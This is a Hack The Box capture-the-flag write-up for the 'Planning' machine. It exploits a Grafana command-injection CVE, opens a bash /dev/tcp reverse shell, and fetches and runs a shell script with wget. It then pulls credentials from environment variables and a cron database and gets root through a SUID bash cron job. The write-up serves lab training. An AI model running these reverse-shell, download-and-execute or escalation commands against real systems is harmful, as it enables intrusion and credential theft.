---
title: Planning [Easy]
date: 2025-08-19
tags: [htb, linux, nmap, gobuster, grafana, cve-2024-9264, penelope, cronjob, suid, port-forwarding, db]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/planning-htb-release-area-machine
image: /assets/img/planning-htb-release-area-machine/planning-htb-release-area-machine_banner.png
---

# Planning HTB Release Area Machine
## Machine information
As is common in real life pentests, you will start the Planning box with credentials for the following account: `admin` / `0D5oT70Fq13EvB5r`. <br>
Author: [d00msl4y3r](https://app.hackthebox.com/users/128944) and [FisMatHack](https://app.hackthebox.com/users/1076236)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.237.241
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-18 10:12 EDT
Nmap scan report for 10.129.237.241 (10.129.237.241)
Host is up (1.1s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.65 seconds
```

Add these to `/etc/hosts` file:
```bash
10.129.237.241     planning.htb
```

Let's check the web server.

### Web Enumeration
![Planning Website](/assets/img/planning-htb-release-area-machine/planning-htb-release-area-machine_website.png)

So it was **EDUKATE** website, lol it supposed to be **EDUCATE** one (nah just joking :>). What we see is that there is a search bar but seems like it not implemented yet. <br>
Keep scrolling down to discover more.

![Planning Courses](/assets/img/planning-htb-release-area-machine/planning-htb-release-area-machine_courses.png)

There are some courses on `/course.php` endpoint. <br>
&rarr; Let's check *Course Detail*.

![Planning Course Detail](/assets/img/planning-htb-release-area-machine/planning-htb-release-area-machine_course-detail.png)

We are in `/detail.php` endpoint. Let's click on **Enroll Now** button.

![Planning Enroll Now](/assets/img/planning-htb-release-area-machine/planning-htb-release-area-machine_enroll-now.png)

So we need to fill the form.

![Planning Success Register](/assets/img/planning-htb-release-area-machine/planning-htb-release-area-machine_success-register.png)

After we filled the form and Submit, there just a pop up *Successful registration* message. <br>
So we can not explode any further from this page. <br>
&rarr; Let's fuzzing for subdomains if there is any.

### Subdomain Fuzzing
```bash
└─$ gobuster vhost -u http://planning.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt --append-domain -t 50 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://planning.htb/
[+] Method:          GET
[+] Threads:         50
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: grafana.planning.htb Status: 302 [Size: 29] [--> /login]
Progress: 235595 / 653921 (36.03%)
```

Waiting for a while and we got `grafana.planning.htb` subdomain. <br>
&rarr; Add it to `/etc/hosts` file.

```bash
10.129.237.241     planning.htb grafana.planning.htb
```

Let's check the `grafana.planning.htb` website.

![Planning Grafana](/assets/img/planning-htb-release-area-machine/planning-htb-release-area-machine_grafana.png)

We are in the login page. Remember that we have `admin` / `0D5oT70Fq13EvB5r` credentials from the machine information. <br>
&rarr; Login with these credentials.

![Planning Grafana Dashboard](/assets/img/planning-htb-release-area-machine/planning-htb-release-area-machine_grafana-dashboard.png)

First thing gonna check is the version of Grafana.

![Planning Grafana Version](/assets/img/planning-htb-release-area-machine/planning-htb-release-area-machine_grafana-version.png)

It's `v11.0.0` and then searching for vulnerabilities cve. <br>
&rarr; Found out [GHSA-q99m-qcv4-fpm7](https://github.com/advisories/GHSA-q99m-qcv4-fpm7) advisory about **Grafana Command Injection And Local File Inclusion Via Sql Expressions** which leads to [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264).

### CVE-2024-9264
Searching for exploit POC and found out [CVE-2024-9264](https://github.com/nollium/CVE-2024-9264) repository. <br>
&rarr; Let's exploit it.

```bash
└─$ python3 CVE-2024-9264.py -u admin -p '0D5oT70Fq13EvB5r' -f /etc/passwd http://grafana.planning.htb/
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Reading file: /etc/passwd
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/etc/passwd'):
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
grafana:x:472:0::/home/grafana:/usr/sbin/nologin
```

This one confirmed that the script is working. <br>
&rarr; Gonna check out the current user and content.

```bash
└─$ python3 CVE-2024-9264.py -u admin -p '0D5oT70Fq13EvB5r' -c 'whoami' http://grafana.planning.htb/
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: whoami
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('whoami >/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
root

└─$ python3 CVE-2024-9264.py -u admin -p '0D5oT70Fq13EvB5r' -c 'ls -la' http://grafana.planning.htb/
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: ls -la
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('ls -la >/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
total 64
drwxr-xr-x  1 root    root  4096 Mar  1 18:01 .
drwxr-xr-x  1 root    root  4096 May 14  2024 ..
drwxrwxrwx  2 grafana root  4096 May 14  2024 .aws
drwxr-xr-x  3 root    root  4096 Mar  1 18:01 .duckdb
-rw-r--r--  1 root    root 34523 May 14  2024 LICENSE
drwxr-xr-x  2 root    root  4096 May 14  2024 bin
drwxr-xr-x  3 root    root  4096 May 14  2024 conf
drwxr-xr-x 16 root    root  4096 May 14  2024 public
```

So doing this we have to change the command so we need to reverse shell to make it easier for discovery.

We gonna set up a reverse shell listener via [Penelope](https://github.com/brightio/penelope) tool.

```bash
└─$ penelope -p 3333
[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.10.16.36
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Then we gonna use this command `bash -i >& /dev/tcp/10.10.16.36/3333 0>&1` for our reverse shell.

```bash
└─$ python3 CVE-2024-9264.py -u admin -p '0D5oT70Fq13EvB5r' -c 'bash -i >& /dev/tcp/10.10.16.36/3333 0>&1' http://grafana.planning.htb/     
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: bash -i >& /dev/tcp/10.10.16.36/3333 0>&1
[-] Unexpected response format:
[-] {
    "results": {
        "B": {
            "error": "exit status 1sh: 1: Syntax error: Bad fd number\nIO Error: Pipe process exited with non-zero exit code=\"2\": bash -i >& /dev/tcp/10.10.16.36/3333 0>&1 >/tmp/grafana_cmd_output 2>&1 |\n",
            "errorSource": "",
            "status": 500,
            "frames": []
        }
    }
}
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
total 64
drwxr-xr-x  1 root    root  4096 Mar  1 18:01 .
drwxr-xr-x  1 root    root  4096 May 14  2024 ..
drwxrwxrwx  2 grafana root  4096 May 14  2024 .aws
drwxr-xr-x  3 root    root  4096 Mar  1 18:01 .duckdb
-rw-r--r--  1 root    root 34523 May 14  2024 LICENSE
drwxr-xr-x  2 root    root  4096 May 14  2024 bin
drwxr-xr-x  3 root    root  4096 May 14  2024 conf
drwxr-xr-x 16 root    root  4096 May 14  2024 public
```

So we got some error and trying out with `python` even failed. <br>
&rarr; We will try this approach that we will create a `shell.sh` file and then use `wget` to download and execute it.

But we need to make sure that the `/usr/bin/wget` is available in the system.

```bash
└─$ python3 CVE-2024-9264.py -u admin -p '0D5oT70Fq13EvB5r' -c 'which wget' http://grafana.planning.htb/                                                               
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: which wget
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('which wget >/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
/usr/bin/wget
```

Confirmed that it is available. Let's create a `shell.sh` file.

```bash
└─$ cat shell.sh                                           
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.36/3333 0>&1
```

```bash
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Host the `shell.sh` file on the our kali machine.

```bash
└─$ python3 CVE-2024-9264.py -u admin -p '0D5oT70Fq13EvB5r' -c 'wget http://10.10.16.36/shell.sh' http://grafana.planning.htb/
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: wget http://10.10.16.36/shell.sh
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('wget http://10.10.16.36/shell.sh >/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
--2025-08-18 15:21:23--  http://10.10.16.36/shell.sh
Connecting to 10.10.16.36:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 54 [text/x-sh]
Saving to: 'shell.sh'

     0K                                                       100% 1.40K=0.04s

2025-08-18 15:21:24 (1.40 KB/s) - 'shell.sh' saved [54/54]
```

```bash
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.237.241 - - [18/Aug/2025 11:21:23] "GET /shell.sh HTTP/1.1" 200 -
```

We successfully download the file.

```bash
└─$ python3 CVE-2024-9264.py -u admin -p '0D5oT70Fq13EvB5r' -c 'ls' http://grafana.planning.htb/     
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: ls
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('ls >/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
LICENSE
bin
conf
public
shell.sh
```

Now let's execute it.

```bash
└─$ python3 CVE-2024-9264.py -u admin -p '0D5oT70Fq13EvB5r' -c 'bash shell.sh' http://grafana.planning.htb/
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: bash shell.sh
```

```bash
└─$ penelope -p 3333
[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.10.16.36
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from 7ce659d667d7~10.129.237.241-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[!] Python agent cannot be deployed. I need to maintain at least one basic session to handle the PTY
[+] Attempting to spawn a reverse shell on 10.10.16.36:3333
[+] Got reverse shell from 7ce659d667d7~10.129.237.241-Linux-x86_64 😍 Assigned SessionID <2>
[+] Shell upgraded successfully using /usr/bin/script! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/7ce659d667d7~10.129.237.241-Linux-x86_64/2025_08_18-11_22_01-499.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@7ce659d667d7:~# ls -la
total 76
drwxr-xr-x  1 root    root  4096 Aug 18 15:22 .
drwxr-xr-x  1 root    root  4096 May 14  2024 ..
drwxrwxrwx  2 grafana root  4096 May 14  2024 .aws
-rw-------  1 root    root  1366 Aug 18 15:22 .bash_history
drwxr-xr-x  3 root    root  4096 Mar  1 18:01 .duckdb
-rw-r--r--  1 root    root 34523 May 14  2024 LICENSE
drwxr-xr-x  2 root    root  4096 May 14  2024 bin
drwxr-xr-x  3 root    root  4096 May 14  2024 conf
drwxr-xr-x 16 root    root  4096 May 14  2024 public
-rw-r--r--  1 root    root    54 Aug 18 15:20 shell.sh
root@7ce659d667d7:~#
```

Got our reverse shell.

> **Note:** To use this *CVE-2024-9264*, better create an environment `venv-cve` and install the `requirements.txt` in order not to get conflicts with our dependencies.

## Initial Access
From this point, we leverage the credentials provided to got into the machine.

### Discovering
After go around, we found out this interesting file.

```bash
root@7ce659d667d7:/# ls -la
total 64
drwxr-xr-x   1 root root 4096 Apr  4 10:23 .
drwxr-xr-x   1 root root 4096 Apr  4 10:23 ..
-rwxr-xr-x   1 root root    0 Apr  4 10:23 .dockerenv
lrwxrwxrwx   1 root root    7 Apr 27  2024 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Apr 18  2022 boot
drwxr-xr-x   5 root root  340 Aug 18 13:49 dev
drwxr-xr-x   1 root root 4096 Apr  4 10:23 etc
drwxr-xr-x   1 root root 4096 May 14  2024 home
lrwxrwxrwx   1 root root    7 Apr 27  2024 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Apr 27  2024 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Apr 27  2024 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Apr 27  2024 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4096 Apr 27  2024 media
drwxr-xr-x   2 root root 4096 Apr 27  2024 mnt
drwxr-xr-x   2 root root 4096 Apr 27  2024 opt
dr-xr-xr-x 291 root root    0 Aug 18 13:49 proc
drwx------   1 root root 4096 Apr  4 12:43 root
drwxr-xr-x   5 root root 4096 Apr 27  2024 run
-rwxr-xr-x   1 root root 3306 May 14  2024 run.sh <- Intresting file
lrwxrwxrwx   1 root root    8 Apr 27  2024 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Apr 27  2024 srv
dr-xr-xr-x  13 root root    0 Aug 18 13:49 sys
drwxrwxrwt   1 root root 4096 Aug 18 15:16 tmp
drwxr-xr-x   1 root root 4096 Apr 27  2024 usr
drwxr-xr-x   1 root root 4096 Apr 27  2024 var
```

We gonna check it out.

```bash
root@7ce659d667d7:/# cat run.sh
#!/bin/bash -e

PERMISSIONS_OK=0

if [ ! -r "$GF_PATHS_CONFIG" ]; then
    echo "GF_PATHS_CONFIG='$GF_PATHS_CONFIG' is not readable."
    PERMISSIONS_OK=1
fi

if [ ! -w "$GF_PATHS_DATA" ]; then
    echo "GF_PATHS_DATA='$GF_PATHS_DATA' is not writable."
    PERMISSIONS_OK=1
fi

if [ ! -r "$GF_PATHS_HOME" ]; then
    echo "GF_PATHS_HOME='$GF_PATHS_HOME' is not readable."
    PERMISSIONS_OK=1
fi

if [ $PERMISSIONS_OK -eq 1 ]; then
    echo "You may have issues with file permissions, more information here: http://docs.grafana.org/installation/docker/#migrate-to-v51-or-later"
fi

if [ ! -d "$GF_PATHS_PLUGINS" ]; then
    mkdir "$GF_PATHS_PLUGINS"
fi

if [ ! -z ${GF_AWS_PROFILES+x} ]; then
    > "$GF_PATHS_HOME/.aws/credentials"

    for profile in ${GF_AWS_PROFILES}; do
        access_key_varname="GF_AWS_${profile}_ACCESS_KEY_ID"
        secret_key_varname="GF_AWS_${profile}_SECRET_ACCESS_KEY"
        region_varname="GF_AWS_${profile}_REGION"

        if [ ! -z "${!access_key_varname}" -a ! -z "${!secret_key_varname}" ]; then
            echo "[${profile}]" >> "$GF_PATHS_HOME/.aws/credentials"
            echo "aws_access_key_id = ${!access_key_varname}" >> "$GF_PATHS_HOME/.aws/credentials"
            echo "aws_secret_access_key = ${!secret_key_varname}" >> "$GF_PATHS_HOME/.aws/credentials"
            if [ ! -z "${!region_varname}" ]; then
                echo "region = ${!region_varname}" >> "$GF_PATHS_HOME/.aws/credentials"
            fi
        fi
    done

    chmod 600 "$GF_PATHS_HOME/.aws/credentials"
fi

# Convert all environment variables with names ending in __FILE into the content of
# the file that they point at and use the name without the trailing __FILE.
# This can be used to carry in Docker secrets.
for VAR_NAME in $(env | grep '^GF_[^=]\+__FILE=.\+' | sed -r "s/([^=]*)__FILE=.*/\1/g"); do
    VAR_NAME_FILE="$VAR_NAME"__FILE
    if [ "${!VAR_NAME}" ]; then
        echo >&2 "ERROR: Both $VAR_NAME and $VAR_NAME_FILE are set (but are exclusive)"
        exit 1
    fi
    echo "Getting secret $VAR_NAME from ${!VAR_NAME_FILE}"
    export "$VAR_NAME"="$(< "${!VAR_NAME_FILE}")"
    unset "$VAR_NAME_FILE"
done

export HOME="$GF_PATHS_HOME"

if [ ! -z "${GF_INSTALL_PLUGINS}" ]; then
  OLDIFS=$IFS
  IFS=','
  for plugin in ${GF_INSTALL_PLUGINS}; do
    IFS=$OLDIFS
    if [[ $plugin =~ .*\;.* ]]; then
        pluginUrl=$(echo "$plugin" | cut -d';' -f 1)
        pluginInstallFolder=$(echo "$plugin" | cut -d';' -f 2)
        grafana cli --pluginUrl ${pluginUrl} --pluginsDir "${GF_PATHS_PLUGINS}" plugins install "${pluginInstallFolder}"
    else
        grafana cli --pluginsDir "${GF_PATHS_PLUGINS}" plugins install ${plugin}
    fi
  done
fi

exec grafana server                                         \
  --homepath="$GF_PATHS_HOME"                               \
  --config="$GF_PATHS_CONFIG"                               \
  --packaging=docker                                        \
  "$@"                                                      \
  cfg:default.log.mode="console"                            \
  cfg:default.paths.data="$GF_PATHS_DATA"                   \
  cfg:default.paths.logs="$GF_PATHS_LOGS"                   \
  cfg:default.paths.plugins="$GF_PATHS_PLUGINS"             \
  cfg:default.paths.provisioning="$GF_PATHS_PROVISIONING"
```

We can see that it's a bash script that is used to run the Grafana server. The things is that it contains some interesting variables which could potentially leak some information.

```bash
root@7ce659d667d7:/# env | grep "^GF_"
GF_PATHS_HOME=/usr/share/grafana
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
```

Got more credentials `enzo:RioTecRANDEntANT!`. <br>
&rarr; Let's `ssh` into `enzo` user.

```bash
└─$ ssh enzo@10.129.237.241            
enzo@10.129.237.241's password: 
enzo@planning:~$ ls -la
total 32
drwxr-x--- 4 enzo enzo 4096 Apr  3 13:49 .
drwxr-xr-x 3 root root 4096 Feb 28 16:22 ..
lrwxrwxrwx 1 root root    9 Feb 28 20:42 .bash_history -> /dev/null
-rw-r--r-- 1 enzo enzo  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 enzo enzo 3771 Mar 31  2024 .bashrc
drwx------ 2 enzo enzo 4096 Apr  3 13:49 .cache
-rw-r--r-- 1 enzo enzo  807 Mar 31  2024 .profile
drwx------ 2 enzo enzo 4096 Feb 28 16:22 .ssh
-rw-r----- 1 root enzo   33 Aug 18 13:49 user.txt
enzo@planning:~$ cat user.txt
6ae53fd6e69c98e2f7192c78909e3350
```

Grab that `user.txt` flag.

### Enzo discover
Now we are in `enzo` user. Let's recon this user.

```bash
enzo@planning:~$ netstat -tunlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:36431         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.54:53           0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

Found out there is another port `8000` and also `3306` is running. <br>
After going through, we found out `crontab.db`.

```bash
enzo@planning:/opt/crontabs$ strings crontab.db
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```

Found out other credentials `P4ssw0rdS0pRi0T3c`. <br>
Now let's port forwarding `8000`.

```bash
└─$ ssh -L 8000:127.0.0.1:8000 enzo@planning.htb 
enzo@planning.htb's password: 
enzo@planning:~$
```

![Planning Port Forwarding](/assets/img/planning-htb-release-area-machine/planning-htb-release-area-machine_port-forwarding.png)

Enter the credentials `root:P4ssw0rdS0pRi0T3c`.

![Planning Port Forwarding](/assets/img/planning-htb-release-area-machine/planning-htb-release-area-machine_port-forwarding-2.png)

We are in and seeing the **Cronjob** page.

From this point, we thinking approach that we will create new job and leverage `/bin/bash` and set SUID bit to it so we can escalate to `root` user.

## Privilege Escalation
Let's root.

### Cronjob & SUID Bash
We will click on **New** button to create new job. Then we will add `cp /bin/bash /tmp/bash && chmod u+s /tmp/bash` to the command.

![Planning Cronjob](/assets/img/planning-htb-release-area-machine/planning-htb-release-area-machine_cronjob.png)

Click the **Set** button to set the schedule to `* * * * *`. <br>
&rarr; Then click the **Save** button.

![Planning Cronjob](/assets/img/planning-htb-release-area-machine/planning-htb-release-area-machine_cronjob-2.png)

We will see that our job is created. <br>
&rarr; Click the **Run Now** button.

Then checking our `/tmp/bash` file.

```bash
enzo@planning:/tmp$ ls -la
total 1472
drwxrwxrwt 14 root root    4096 Aug 18 16:01 .
drwxr-xr-x 22 root root    4096 Apr  3 14:40 ..
-rwsr-xr-x  1 root root 1446024 Aug 18 16:01 bash
-rw-r--r--  1 root root       0 Aug 18 16:01 EDUmC71YQOtzUMed.stderr
-rw-r--r--  1 root root       0 Aug 18 16:01 EDUmC71YQOtzUMed.stdout
drwxrwxrwt  2 root root    4096 Aug 18 13:48 .font-unix
drwxrwxrwt  2 root root    4096 Aug 18 13:48 .ICE-unix
drwx------  3 root root    4096 Aug 18 14:18 systemd-private-c2da187b5da84a92a1c1f7cda9dc0cd8-fwupd.service-d4n06q
drwx------  3 root root    4096 Aug 18 13:48 systemd-private-c2da187b5da84a92a1c1f7cda9dc0cd8-ModemManager.service-BAcFBI
drwx------  3 root root    4096 Aug 18 13:48 systemd-private-c2da187b5da84a92a1c1f7cda9dc0cd8-polkit.service-ABmT9p
drwx------  3 root root    4096 Aug 18 13:48 systemd-private-c2da187b5da84a92a1c1f7cda9dc0cd8-systemd-logind.service-8o8GKi
drwx------  3 root root    4096 Aug 18 13:48 systemd-private-c2da187b5da84a92a1c1f7cda9dc0cd8-systemd-resolved.service-4ufG0y
drwx------  3 root root    4096 Aug 18 13:48 systemd-private-c2da187b5da84a92a1c1f7cda9dc0cd8-systemd-timesyncd.service-Q4VFnC
drwx------  3 root root    4096 Aug 18 14:18 systemd-private-c2da187b5da84a92a1c1f7cda9dc0cd8-upower.service-kv6vPm
drwx------  2 root root    4096 Aug 18 13:49 vmware-root_736-2991268455
drwxrwxrwt  2 root root    4096 Aug 18 13:48 .X11-unix
drwxrwxrwt  2 root root    4096 Aug 18 13:48 .XIM-unix
-rw-r--r--  1 root root       0 Aug 18 16:02 YvZsUUfEXayH6lLj.stderr
-rw-r--r--  1 root root       0 Aug 18 16:02 YvZsUUfEXayH6lLj.stdout
```

We can see that we have `bash` file with SUID bit. <br>
&rarr; Let's execute it.

```bash
enzo@planning:/tmp$ /tmp/bash -p
bash-5.2# id
uid=1000(enzo) gid=1000(enzo) euid=0(root) groups=1000(enzo)
```

Now we are `root` user.

```bash
bash-5.2# cd /root
bash-5.2# ls -la
total 44
drwx------  7 root root 4096 Aug 18 13:49 .
drwxr-xr-x 22 root root 4096 Apr  3 14:40 ..
lrwxrwxrwx  1 root root    9 Feb 28 20:41 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr 22  2024 .bashrc
drwx------  2 root root 4096 Apr  1 11:08 .cache
-rw-------  1 root root   20 Apr  3 15:18 .lesshst
drwxr-xr-x  3 root root 4096 Jul  3 11:08 .local
drwxr-xr-x  4 root root 4096 Feb 28 19:01 .npm
-rw-r--r--  1 root root  161 Apr 22  2024 .profile
-rw-r-----  1 root root   33 Aug 18 13:49 root.txt
drwxr-xr-x  2 root root 4096 Apr  3 12:54 scripts
drwx------  2 root root 4096 Feb 28 16:22 .ssh
bash-5.2# cat root.txt
349832e741e351d7b08334050d294b2b
```

Nailed the `root.txt` flag.

> *Incase you add `chmod u+s /bin/bash` and run, it will work but after a few seconds, it will be removed so doing it in `/tmp` is a better approach.*

![result](/assets/img/planning-htb-release-area-machine/result.png)